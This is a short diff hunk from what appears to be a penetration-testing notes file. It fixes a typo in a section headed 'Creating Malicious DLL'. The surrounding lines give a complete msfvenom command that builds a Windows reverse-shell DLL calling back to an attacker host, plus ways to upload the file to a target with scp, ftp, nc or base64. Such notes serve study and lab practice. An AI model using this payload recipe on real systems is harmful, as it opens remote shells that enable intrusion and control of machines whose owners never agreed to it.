@@ -89,7 +89,7 @@ Creating Malicious DLL
 STEP 1.) DLL CREATION USING MSFVENOM
 - msfvenom -p windows/shell_reverse_tcp LHOST=10.50.x.x LPORT=<xxxx> -f dll > bad.dll
 
-*** Once the malicious dll has been createdit must be uploaded to the host. Use scp, ftp, nc, python simple HTTP server, or copying and pasting base64 dump of file. ***
+*** Once the malicious dll has been created it must be uploaded to the host. Use scp, ftp, nc, python simple HTTP server, or copying and pasting base64 dump of file. ***
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Transferring the DLL
 
